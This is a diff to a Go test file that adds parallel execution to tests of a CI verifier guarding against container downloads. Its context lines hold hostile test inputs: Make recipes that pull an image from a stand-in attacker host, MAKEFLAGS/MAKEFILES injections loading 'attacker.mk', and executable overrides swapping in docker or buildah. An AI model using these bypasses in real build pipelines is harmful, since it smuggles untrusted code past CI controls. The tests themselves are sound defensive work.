@@ -10,6 +10,7 @@ import (
 )
 
 func TestVerifyCIContainerDownloadsRejectsRecipeTimeMakeSynthesis(t *testing.T) {
+	t.Parallel()
 	tests := map[string]string{
 		"shell":               `@echo $(shell docker pull attacker.invalid/image:pinned)`,
 		"braced shell":        `@echo ${shell docker pull attacker.invalid/image:pinned}`,
@@ -36,6 +37,7 @@ func TestVerifyCIContainerDownloadsRejectsRecipeTimeMakeSynthesis(t *testing.T) 
 }
 
 func TestVerifyCIContainerDownloadsRejectsRecursiveMakeControlsAndWrappedEngines(t *testing.T) {
+	t.Parallel()
 	commands := map[string]string{
 		"MAKEFILES assignment":     `$(MAKE) MAKEFILES=attacker.mk safe`,
 		"MAKEFLAGS assignment":     `$(MAKE) "MAKEFLAGS=-f attacker.mk" safe`,
@@ -66,6 +68,7 @@ func TestVerifyCIContainerDownloadsRejectsRecursiveMakeControlsAndWrappedEngines
 }
 
 func TestVerifyCIContainerDownloadsRejectsRecursiveCommandExecutableOverrides(t *testing.T) {
+	t.Parallel()
 	commands := map[string]string{
 		"recursive Docker override":           `$(MAKE) GO=docker safe`,
 		"recursive Buildah override":          `$(MAKE) GO=buildah safe`,
@@ -93,6 +96,7 @@ func TestVerifyCIContainerDownloadsRejectsRecursiveCommandExecutableOverrides(t 
 }
 
 func TestVerifyCIContainerDownloadsRequiresRegisteredWorkflowFilesGlobally(t *testing.T) {
+	t.Parallel()
 	for _, workflow := range []string{"ci-agent.yml", "ci-docs.yml"} {
 		t.Run(workflow+" deleted", func(t *testing.T) {
 			root := writeCIContainerDownloadsFixture(t)
@@ -109,6 +113,7 @@ func TestVerifyCIContainerDownloadsRequiresRegisteredWorkflowFilesGlobally(t *te
 }
 
 func TestVerifyCIContainerDownloadsBindsActionOnlyWorkflowContext(t *testing.T) {
+	t.Parallel()
 	tests := map[string]func(*yaml.Node){
 		"workflow environment": func(workflow *yaml.Node) {
 			setYAMLMappingValue(workflow, "env", yamlMapping("NODE_VERSION", "99"))
@@ -145,6 +150,7 @@ func TestVerifyCIContainerDownloadsBindsActionOnlyWorkflowContext(t *testing.T) 
 }
 
 func TestVerifyCIContainerDownloadsRequiresTypedWorkflowJobContext(t *testing.T) {
+	t.Parallel()
 	tests := map[string]struct {
 		workflow string
 		old      string
@@ -166,6 +172,7 @@ func TestVerifyCIContainerDownloadsRequiresTypedWorkflowJobContext(t *testing.T)
 }
 
 func TestVerifyCIContainerDownloadsRejectsJobLevelReusableWorkflows(t *testing.T) {
+	t.Parallel()
 	root := writeCIContainerDownloadsFixture(t)
 	writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-reusable.yml"), `name: reusable bypass
 on: push
@@ -179,6 +186,7 @@ jobs:
 }
 
 func TestVerifyCIContainerDownloadsRejectsOverridablePostgresImageAuthorities(t *testing.T) {
+	t.Parallel()
 	tests := map[string]struct {
 		variable string
 	}{
